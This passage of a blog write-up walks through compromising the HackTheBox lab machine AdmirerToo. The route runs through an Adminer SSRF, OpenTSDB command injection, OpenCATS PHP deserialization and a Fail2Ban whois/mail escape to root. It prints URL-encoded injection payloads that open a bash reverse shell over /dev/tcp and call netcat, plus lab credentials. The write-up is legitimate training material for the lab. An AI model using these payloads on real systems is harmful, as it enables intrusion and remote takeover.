<p>So I setup the redirection script to redirect requests to my box on port <strong>80</strong> to the filtered service at http://127.0.0.1:4242. I then send a login request with the server set to my box and driver set to <em>elastic</em> (for Elasticsearch);</p>

<p><img data-src="/assets/img/20220214161416.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220214161606.png" alt="" data-proofer-ignore></p>

<p>This worked, and I got a response from the hidden service;</p>

<p><img data-src="/assets/img/20220214161741.png" alt="" data-proofer-ignore></p>

<p>It seems the service supports the HTTP protocol. The title <strong>OpenTSDB</strong> looks interesting, so I started googling it;</p>

<blockquote>
  <p><strong>OpenTSDB</strong> is <em>a distributed, scalable Time Series Database</em> (TSDB) written on top of HBase. OpenTSDB was written to address a common need: store, index and serve metrics collected from computer systems (network gear, operating systems, applications) at a large scale, and make this data easily accessible and graphable.</p>
</blockquote>

<p>Seaching for known exploits for this service, I found a <em>Command Injection</em> vulnerability at https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yaml</p>

<p>Using the PoC provided that runs a <code class="language-plaintext highlighter-rouge">wget</code> command, I got a long error message about a missing “metric”;</p>

<p><img data-src="/assets/img/20220214164802.png" alt="" data-proofer-ignore></p>

<p>Googling on what exactly a “metric” is in this service, I learned that;</p>

<blockquote>
  <p>In OpenTSDB, a metric is <strong>named with a string</strong>, like http. hits . To be able to store all the different values for all the places where this metric exists, you tag the data with one or more tags when you send them to the TSD. TSD stores the timestamp, the value, and the tags.</p>
</blockquote>

<p>There is a way to list available metrics using the query <code class="language-plaintext highlighter-rouge">/api/suggest?type=metrics</code>. Using it on the host returned one entry <code class="language-plaintext highlighter-rouge">http.stats.web.hits</code>;</p>

<p><img data-src="/assets/img/20220214165423.png" alt="" data-proofer-ignore></p>

<p>So I updated the exploit using this metric;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27nc%2010.10.16.53%20443%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
</pre></td></tr></tbody></table></code></div></div>

<p>And bingo!!!</p>

<p><img data-src="/assets/img/20220214170430.png" alt="" data-proofer-ignore></p>

<p>I used this exploit to spawn a shell on the box as <strong>opentsdb</strong> user;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(%27%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.53%2F443%200%3E%261%22%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/20220215033044.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="user">User<a href="#user" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>Local user with the name <strong>jennifer</strong> exists. The user I am working as is not part of any groups. <code class="language-plaintext highlighter-rouge">linPEAS</code> found some creds;</p>

<p><img data-src="/assets/img/20220215034950.png" alt="" data-proofer-ignore></p>

<p>This creds were found in the file <code class="language-plaintext highlighter-rouge">/etc/opencats/config.php</code>. I was able to login to the local MySQL server using it;</p>

<p><img data-src="/assets/img/20220215035343.png" alt="" data-proofer-ignore></p>

<p>This user has access to only one database, which contains the below tables;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>+--------------------------------------+
| Tables_in_cats_dev                   |
+--------------------------------------+
---[snip]---
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
</pre></td></tr></tbody></table></code></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">user</code> looks interesting, and was found to contain some hashes;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>MariaDB [cats_dev]&gt; select user_id, email, user_name, password from user;
+---------+-------------------------+----------------+----------------------------------+
| user_id | email                   | user_name      | password                         |
+---------+-------------------------+----------------+----------------------------------+
|       1 | admin@testdomain.com    | admin          | dfa2a420a4e48de6fe481c90e295fe97 |
|    1250 | 0                       | cats@rootadmin | cantlogin                        |
|    1251 | jennifer@admirertoo.htb | jennifer       | f59f297aa82171cc860d76c390ce7f3e |
+---------+-------------------------+----------------+----------------------------------+
3 rows in set (0.001 sec)
</pre></td></tr></tbody></table></code></div></div>

<p>I was unable to crack any of the hashes using the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist with <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>

<p>The box doesn’t allow to me to list the processes of other users, only mine;</p>

<p><img data-src="/assets/img/20220215091250.png" alt="" data-proofer-ignore></p>

<p>Using <code class="language-plaintext highlighter-rouge">pspy</code> also didn’t help, so we are probably in a jailed environment.</p>

<p>There are a few other ports listening;</p>

<p><img data-src="/assets/img/20220215091442.png" alt="" data-proofer-ignore></p>

<p>The service on port <strong>8080</strong> caught my attention. This is a port normally used by web proxies, so I tried to use it with <code class="language-plaintext highlighter-rouge">curl</code> to make a request, but it didn’t work;</p>

<p><img data-src="/assets/img/20220215093108.png" alt="" data-proofer-ignore></p>

<p>It keeps closing connections about one second after they were established, even without sending any data.</p>

<p>Looking at the <code class="language-plaintext highlighter-rouge">/opt</code> directory, I saw 2 directories owned by the <code class="language-plaintext highlighter-rouge">root</code> user;</p>

<p><img data-src="/assets/img/20220215093232.png" alt="" data-proofer-ignore></p>

<p>A quick search in <code class="language-plaintext highlighter-rouge">searchsploit</code> showed 2 vulns for <em>OpenCATS</em>;</p>

<p><img data-src="/assets/img/20220215093404.png" alt="" data-proofer-ignore></p>

<p>This is a <em>free open-source applicant tracking system (ATS).</em>, with documentation at https://opencats-documentation.readthedocs.io/</p>

<p>After further enumeration of the filesystem, the file <code class="language-plaintext highlighter-rouge">/var/www/adminer/plugins/data/server.php</code> was found to contain the configuration of the <em>one-click login</em> plugin installed in Adminer. The file contains a commented-out password, which turns out to be the password of <strong>jennifer</strong>. This was easier than I expected;</p>

<div class="language-php highlighter-rouge"><div class="code-header"><span label-text="PHP"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">return</span> <span class="p">[</span>
  <span class="s1">'localhost'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
<span class="c1">//    'username' =&gt; 'admirer',</span>
<span class="c1">//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',</span>
<span class="c1">// Read-only account for testing</span>
    <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'admirer_ro'</span><span class="p">,</span>
    <span class="s1">'pass'</span>     <span class="o">=&gt;</span> <span class="s1">'1w4nn4b3adm1r3d2!'</span><span class="p">,</span>
    <span class="s1">'label'</span>    <span class="o">=&gt;</span> <span class="s1">'MySQL'</span><span class="p">,</span>
    <span class="s1">'databases'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
      <span class="s1">'admirer'</span> <span class="o">=&gt;</span> <span class="s1">'Admirer DB'</span><span class="p">,</span>
    <span class="p">)</span>
  <span class="p">),</span>
<span class="p">];</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This password gave me access to the box over SSH as <strong>jennifer</strong>;</p>

<p><img data-src="/assets/img/20220215094647.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc<a href="#privesc" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p><strong>jennifer</strong> does not have <code class="language-plaintext highlighter-rouge">sudo</code> permissions on the box, and I still cannot list running processes belonging to other users.</p>

<p>Looking for attack vectors, I noticed the modification date of <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code> dates back to <strong>15 Jan 2019</strong>. This indicate it may be vulnerable to the <em>pwnkit</em> exploit. Searching for exploits, I found one at https://github.com/ly4k/PwnKit. Testing the exploit on the box, I was elevated to root immediately. This is way too easy for a <strong>hard</strong> box, so I contacted a staff through the HTB discord, and found out it is indeed unintended. So I switched back to <strong>jennifer</strong>, and started looking for the intended way.</p>

<p>Since I now have access to the box over SSH, I can use it to setup tunnels to those local ports, and hopefully identify them using <code class="language-plaintext highlighter-rouge">nmap</code>. After setting up the tunnels, I performed a version scan on the ports;</p>

<p><img data-src="/assets/img/20220215101505.png" alt="" data-proofer-ignore></p>

<p>The service on port <strong>8080</strong> was now identified as <em>Apache httpd 2.4.38 ((Debian))</em>. Opening it up in my browser, I got a login page;</p>

<p><img data-src="/assets/img/20220215101822.png" alt="" data-proofer-ignore></p>

<p>Testing the credentials I have up to this point for an easy win, I was able to login using the username <code class="language-plaintext highlighter-rouge">jennifer</code> and password <code class="language-plaintext highlighter-rouge">bQ3u7^AxzcB7qAsxE3</code>;</p>

<p><img data-src="/assets/img/20220215102211.png" alt="" data-proofer-ignore></p>

<p>The footer showed the version of <strong>OpenCATS</strong> running is <strong>0.9.5.2</strong>. Notice that <em>jennifer</em> has read-only access to the service</p>

<p><br /></p>

<h4 id="opencats">OpenCATS<a href="#opencats" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>With the version of <strong>OpenCATS</strong> now known, I started looking for exploits. The article https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html showed that the service is vulnerable to <em>arbitrary file write</em> due to unsafe PHP object deserialization.</p>

<blockquote>
  <p>OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.</p>
</blockquote>

<p>The request of interest is triggered after hitting any of the below links;</p>

<p><img data-src="/assets/img/20220215110734.png" alt="" data-proofer-ignore></p>

<p>This generate a GET request with the parameter <code class="language-plaintext highlighter-rouge">parametersactivity:ActivityDataGrid</code> containing the serialized PHP object;</p>

<p><img data-src="/assets/img/20220215114134.png" alt="" data-proofer-ignore></p>

<p>Following the article, I tried to write a file to the root of the web app at <code class="language-plaintext highlighter-rouge">/opt/opencats</code>, but got a <strong>500</strong> error response. This is probably because of permission issues as the web root is owned by the root user.</p>

<p>So I tried to create a file in the globally writable directory <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and it worked;</p>

<p><img data-src="/assets/img/20220215161307.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220215161455.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220215161532.png" alt="" data-proofer-ignore></p>

<p>The file is created as the user <strong>devel</strong>. The user <strong>devel</strong> does not have a login shell, and his home directory does not exist;</p>

<p><img data-src="/assets/img/20220215161640.png" alt="" data-proofer-ignore></p>

<p>So I begin to search the filesystem for files and directories this user owns, and found a few;</p>

<p><img data-src="/assets/img/20220215114845.png" alt="" data-proofer-ignore></p>

<p><strong>devel</strong> has write permissions on two key directories;</p>

<p><img data-src="/assets/img/20220215161814.png" alt="" data-proofer-ignore></p>

<p>Both directories are empty. The directory <code class="language-plaintext highlighter-rouge">/usr/local/etc</code> is used by some programs to store and load configuration files. So I started looking for any program I could exploit using this. Listing running services using <code class="language-plaintext highlighter-rouge">systemctl</code> showed that <em>Fail2Ban</em>, which is an IPS-like service that blocks suspicious IPs, is running on the host;</p>

<p><img data-src="/assets/img/20220215170016.png" alt="" data-proofer-ignore></p>

<p>Searching for known expoits for this service, I found an article explaining how it could be exploited at https://research.securitum.com/fail2ban-remote-code-execution/</p>

<p>The article explains how data passed to the <code class="language-plaintext highlighter-rouge">mail</code> command without validation can lead to <em>arbitrary code execution</em> using the <code class="language-plaintext highlighter-rouge">~!</code> escape sequence. I was able to test this locally, and it worked. A shell command was executed in my default login shell;</p>

<p><img data-src="/assets/img/20220215170817.png" alt="" data-proofer-ignore></p>

<p>Reading further into the article, this paragraph was particularly interesting;</p>

<p><img data-src="/assets/img/20220215171014.png" alt="" data-proofer-ignore></p>

<p>When <em>Fail2Ban</em> bans an IP, it sends an email notification to a defined address. The email will contain the result of a <em>whois</em> lookup for the IP address. So if I could control this, I could add a command that will be executed in the result of the whois lookup.</p>

<p>Testing this with a user account that does not have a default shell didn’t work;</p>

<p><img data-src="/assets/img/20220215172244.png" alt="" data-proofer-ignore></p>

<p>Changing the escape from <code class="language-plaintext highlighter-rouge">~!</code> to <code class="language-plaintext highlighter-rouge">~|</code> did the trick;</p>

<p><img data-src="/assets/img/20220215172357.png" alt="" data-proofer-ignore></p>

<p>Now all I needed to do is create a <em>whois</em> config that will direct all whois lookups to my machine on port <strong>43</strong>. To do this, I need to create a configuration file at <code class="language-plaintext highlighter-rouge">/usr/local/etc/whois.conf</code> that will be used by <code class="language-plaintext highlighter-rouge">whois</code>. I can use the deserialization exploit to do this, but the problem is other data is added to my payload;</p>

<p><img data-src="/assets/img/20220215173720.png" alt="" data-proofer-ignore></p>

<p>Note that only the highlighted text is my actual payload. After studying a bit on whois configuration files, I learned that the configurations have to be in <em>regular expression</em>. After lots of trials and errors, I was able to craft a valid <em>whois</em> config file to match my IP address using the payload <code class="language-plaintext highlighter-rouge">"}]|10.10.16.53 [10.10.16.53]</code>;</p>

<p><img data-src="/assets/img/20220215181115.png" alt="" data-proofer-ignore></p>

<p>As you can see above, I was able to get <code class="language-plaintext highlighter-rouge">whois</code> to query my own server. Now I have all I need to execute commands on the box.</p>

<p>With the whois configuration file in place, I started a netcat listener on port <strong>43</strong> to send the payload as a whois response;</p>

<p><img data-src="/assets/img/20220215183213.png" alt="" data-proofer-ignore></p>

<p>Then I started another listener on port <strong>443</strong> to receive the above reverse shell. Now to trigger the exploit, I need to make <em>Fail2Ban</em>, which is running as root, to ban my IP. This will result in a whois request that will be replied to with my payload. To trigger this ban, I bruteforced the SSH login using <code class="language-plaintext highlighter-rouge">hydra</code>, which made <em>Fail2Ban</em> ban my IP. This resulted in a whois lookup to my box;</p>

<p><img data-src="/assets/img/20220215183555.png" alt="" data-proofer-ignore></p>

<p>The request hangs however, and I had to press <code class="language-plaintext highlighter-rouge">CTRL + C</code> to exit. After closing the fake whois server, my payload was executed, and I got a shell in the box as root;</p>

<p><img data-src="/assets/img/20220215183848.png" alt="" data-proofer-ignore></p>

<p>This is the <em>hard</em> box I managed to solve, and even though it took some nudges, I was very happy!!!</p>

<p><br /></p>

<hr />
<h3 id="summary">Summary<a href="#summary" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>80</strong>, and <strong>4242</strong> (filtered) with <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found a subdomain <code class="language-plaintext highlighter-rouge">db.admirer-galley.htb</code>  running an instance of <em>Adminer</em>.</li>
  <li>Exploited an <em>SSRF</em> flaw in <em>Adminer</em> to access the service on port <strong>4242</strong>.</li>
  <li>Service on port <strong>4242</strong> (OpenTSDB) was found to be vulnerable to <strong>RCE</strong>, which gave me access to the box as the local user <strong>opentsdb</strong>.</li>
  <li>Inside as <strong>opentsdb</strong>
    <ul>
      <li>Recovered a password in the configuration file of the one-click login plugin used by Adminer.</li>
      <li>Gained access to the account of <strong>jennifer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>jennifer</strong>
    <ul>
      <li>Setup a tunnel to an instance of <em>OpenCATS</em> running locally on port <strong>8080</strong>, and logged in as <strong>jennifer</strong>.</li>
      <li>Exploited a PHP deserialization flaw to create files on the server as the user <strong>devel</strong>.</li>
      <li><strong>devel</strong> has write access to <code class="language-plaintext highlighter-rouge">/usr/local/etc</code>, which I exploited to create <code class="language-plaintext highlighter-rouge">whois</code> config that queries my server.</li>
      <li>Exploited the way <em>Fail2Ban</em> is calling <code class="language-plaintext highlighter-rouge">mail</code> with the output of whois lookups to gain code execution as <strong>root</strong>.</li>
    </ul>
  </li>
</ul>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories --><div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/hackthebox/'>hackthebox</a></div><!-- tags --><div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a><a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a><a href="/tags/web/"
          class="post-tag no-text-decoration" >web</a><a href="/tags/adminer/"
          class="post-tag no-text-decoration" >adminer</a><a href="/tags/mysql/"
          class="post-tag no-text-decoration" >mysql</a><a href="/tags/php/"
          class="post-tag no-text-decoration" >php</a><a href="/tags/ssrf/"
          class="post-tag no-text-decoration" >ssrf</a><a href="/tags/opentsdb/"
          class="post-tag no-text-decoration" >opentsdb</a><a href="/tags/rce/"
          class="post-tag no-text-decoration" >rce</a><a href="/tags/opencats/"
          class="post-tag no-text-decoration" >opencats</a><a href="/tags/fail2ban/"
          class="post-tag no-text-decoration" >fail2ban</a><a href="/tags/whois/"
          class="post-tag no-text-decoration" >whois</a><a href="/tags/object-injection/"
          class="post-tag no-text-decoration" >object injection</a><a href="/tags/insecure-deserialization/"
          class="post-tag no-text-decoration" >insecure deserialization</a><a href="/tags/phpggc/"
          class="post-tag no-text-decoration" >phpggc</a></div><div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a> by the author.</div><!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=AdmirerToo - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a><a href="https://www.facebook.com/sharer/sharer.php?title=AdmirerToo - HackTheBox - 4g3nt47&u=https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a><a href="https://telegram.me/share?text=AdmirerToo - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/admirertoo.html" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a><i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>
</div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

</div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access"><!--<div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/rce/">rce</a><a class="post-tag" href="/tags/sql-injection/">sql injection</a></div>
  </div>-->
    </div><!-- BS-toc.js will be loaded at medium priority -->
<script src="/assets/js/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div></div>

</div>

<!-- tail --><div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  --><!-- An random integer that bigger than 0  --><!-- Equals to TAG_SCORE / {max_categories_hierarchy}  --><!-- Fill with the other newlest posts  --><div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4"><div class="card">
        <a href="/posts/hackthebox/timing.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-06-04 00:00:00 +0100">Jun  4, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Timing - HackTheBox</h3>
            <div class="text-muted small">
              <p>Timing is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/forge.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-01-23 00:00:00 +0100">Jan 23, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Forge - HackTheBox</h3>
            <div class="text-muted small">
              <p>Forge is a very nice medium linux box featuring a web service that allows for local and remote file upload (via URL). After the upload, user is given a random URL to access the uploaded file. This ...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/horizontall.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-02-05 00:00:00 +0100">Feb  5, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Horizontall - HackTheBox</h3>
            <div class="text-muted small">
              <p>Horizontall is an easy linux box featuring two RCEs. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which ...
              </p>
            </div>
          </div>
        </a>
      </div></div> <!-- .card-deck -->
  </div> <!-- #related-posts --><!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between"><a href="/posts/hackthebox/pandora.html" class="btn btn-outline-primary"
    prompt="Older">
    <p>Pandora - HackTheBox</p>
  </a><a href="/posts/hackthebox/timing.html" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Timing - HackTheBox</p>
  </a></div>
<!--  The comments switcher --></div>
  </div>
</div> <!-- .row --><!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/UmarAbdoul">Umar Abdul</a>.<span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p>
    </div>

    <div class="footer-right">
      <p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>
</div><!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints"><div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/rce/">rce</a><a class="post-tag" href="/tags/sql-injection/">sql injection</a></div>
  </div></div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>
</div> <!-- #main-wrapper --><div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a><!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
--><script src="/assets/js/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>
<!--
  JS selector for site.
-->

<!-- layout specified --><!-- image lazy-loading & popup -->
  <script src="/assets/js/clipboard.min.js"></script><script defer src="/assets/js/dist/post.min.js"></script><!-- commons -->

<script src="/assets/js/bootstrap.min.js"></script></body>

</html>
